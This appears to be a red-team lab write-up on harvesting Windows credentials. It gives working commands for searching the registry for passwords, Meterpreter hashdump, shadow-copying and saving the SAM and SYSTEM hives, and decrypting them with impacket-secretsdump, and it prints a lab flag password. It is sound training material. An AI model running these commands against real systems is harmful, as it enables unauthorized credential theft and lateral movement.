# Credentials Harvesting

Credential harvesting consists of techniques for obtaining credentials like login information, account names, 
and passwords. It is a technique of extracting credential information from a system in various locations such 
as clear-text files, registry, memory dumping, etc. 

As a red teamer, gaining access to legitimate credentials has benefits:

- It can give access to systems (Lateral Movement).
- It makes it harder to detect our actions.
- It provides the opportunity to create and manage accounts to help achieve the end goals of a red team 
engagement.

Learning Objectives

### Credentials Harvesting

Credentials Harvesting is a term for gaining access to user and system credentials. It is a technique to look 
for or steal stored credentials, including network sniffing, where an attacker captures transmitted 
credentials. 

Credentials can be found in a variety of different forms, such as:

- Accounts details (usernames and passwords)
- Hashes that include NTLM hashes, etc.
- Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)
- Any information that helps login into a system (private keys, etc.)

Generally speaking, there are two types of credential harvesting: external and internal. External credential 
harvesting most likely involves phishing emails and other techniques to trick a user into entering his 
username and password. Obtaining credentials through the internal network uses different approaches.

### Credential Access

Credential access is where adversaries may find credentials in compromised systems and gain access to user 
credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important 
step for lateral movement and accessing other resources such as other applications or systems. Obtaining 
legitimate user credentials is preferred rather than exploiting systems using CVEs.

For more information, you may visit the [MITRE ATT&CK framework (TA0006)](https://attack.mitre.org/tactics/TA0006/).

Credentials are stored insecurely in various locations in systems:

- Clear-text files
- Database files
- Memory
- Password managers
- Enterprise Vaults
- Active Directory
- Network Sniffing

**Clear-text Files**

Attackers may search a compromised machine for credentials in local or remote file systems. Clear-text files 
could include sensitive information created by a user, containing passwords, private keys, etc. The MITRE 
ATT&CK framework defines it as [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/).

The following are some of the types of clear-text files that an attacker may be interested in:

- Commands history
- Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code 

As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a 
user profile in the following path:

`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

It might be worth checking what users are working on or finding sensitive information. Another example would 
be finding interesting information. For example, the following command is to look for the "password" keyword 
in the Window registry.

Looking for the "password" Keyword in the Registry

```          
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

HKEY_LOCAL_MACHINE\SYSTEM\THM
    flag    REG_SZ    password: 7tyh4ckm3

**Database Files**

Applications utilize database files to read or write settings, configurations, or credentials. Database 
files are usually stored locally in Windows operating systems. These files are an excellent target to check 
and hunt for credentials.

**Password Managers**

A password manager is an application to store and manage users' login information for local and Internet 
websites and services. Since it deals with users' data, it must be stored securely to prevent unauthorized 
access. 

Examples of Password Manager applications:

- Built-in password managers (Windows)
- Third-party: KeePass, 1Password, LastPass

However, misconfiguration and security flaws are found in these applications that let adversaries access 
stored data. Various tools could be used during the enumeration stage to get sensitive data in password 
manager applications used by Internet browsers and desktop applications.

We will discuss how to access the Windows Credentials manager and extract passwords.

**Memory Dump**

The Operating system's memory is a rich source of sensitive information that belongs to the Windows OS, 
users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, 
accessing memory is limited to administrator users who fully control the system.

The following are examples of memory stored sensitive data, including:

- Clear-text credentials
- Cached passwords
- AD Tickets

We will discuss how to get access to memory and extract clear-text passwords and authentication tickets.

**Active Directory**

Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the 
Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid 
design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room.

The following are some of the Active Directory misconfigurations that may leak users' credentials.

- Users' description: Administrators set a password in the description for new employees and leave it there, 
which makes the account vulnerable to unauthorized access. 
- Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for 
more information about the vulnerable version of SYSVOL.
- NTDS: Contains AD users' credentials, making it a target for attackers.
- AD Attacks: Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.

**Network Sniffing**

Gaining initial access to a target network enables attackers to perform various network attacks against 
local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets 
the attacker create a rogue or spoof trusted resources within the network to steal authentication 
information such as NTLM hashes.

### Local Windows Credentials

In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' 
details are stored locally within the Windows file system, while domain users' details are stored in the 
centralized Active Directory.

**Keystrokes**

A keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were 
initially designed for legitimate purposes such as feedback for software development or parental control. 

However, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a 
busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we 
can perform keylogging using tools like the Metasploit framework or others.

**Security Account Manager (SAM)**

The SAM is a Microsoft Windows database that contains local account information such as usernames and 
passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. 
Moreover, it can not be read and accessed by any users while the Windows operating system is running. 
However, there are various ways and attacks to dump the content of the SAM database. 

**Metasploit's HashDump**

The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content 
of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump 
copy hashes. For more information about hashdump, you can visit the [rapid7 blog](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/).

```
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
```

**Volume Shadow Copy Service**

The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while 
applications read/write on volumes. You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information 
about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the 
command prompt with administrator privileges as follows,

1. Run cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Run cmd.exe with administrator privileges, then execute the following wmic command:

```
C:\Windows\system32>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```

Use vssadmin, the Volume Shadow Copy Service administrative command-line tool, to list and confirm that we 
have a shadow copy of the C: volume:

```
C:\Windows\system32>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {57531135-fc85-4026-b4c5-f63a0b6850e9}
   Contained 1 shadow copies at creation time: 7/19/2023 11:15:09 AM
      Shadow Copy ID: {77ca7055-5e26-48ea-82a0-7da4a910c36e}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

The output shows that we have successfully created a shadow copy volume of (C:) with the following path: 
`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1. `

As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. In 
order to decrypt it, we need a decryption key which is also stored in the files system in 
`c:\Windows\System32\Config\system`.

Copy both files (sam and system) from the shadow copy volume we generated to the desktop:

```           
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

Copy the files to the attacking machine, and decrypt the sam file using `secretsdump.py`, one of the 
Impacket tools:

`impacket-secretsdump -sam sam -system system LOCAL`

**Registry Hives**

Another possible method for dumping the SAM database content is through the Windows Registry. Windows 
registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we 
can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two 
files to decrypt the SAM database's content.

Run from an Administrator command prompt:

```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```

Decrypt it using `secretsdump.py`, one of the Impacket tools.

`impacket-secretsdump -sam sam-reg -system system-reg LOCAL`

Note that we used the SAM and System files that we extracted from Windows Registry. 

Parameters

- -sam argument is to specify the path for the dumped sam file from the Windows machine
- -system argument is for a path for the system file
- LOCAL argument to decrypt the Local SAM file as this tool handles other types of decryption 

Note if we compare the output against the NTLM hashes we got from Metasploit's Hashdump, the result is 
different. The reason is the other accounts belong to Active Directory, and their information is not stored 
in the System file we have dumped. To Decrypt them, we need to dump the SECURITY file from the Windows file, 
which contains the required files to decrypt Active Directory accounts.

Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are guessable, or we can use 
different techniques to impersonate users using the hashes.
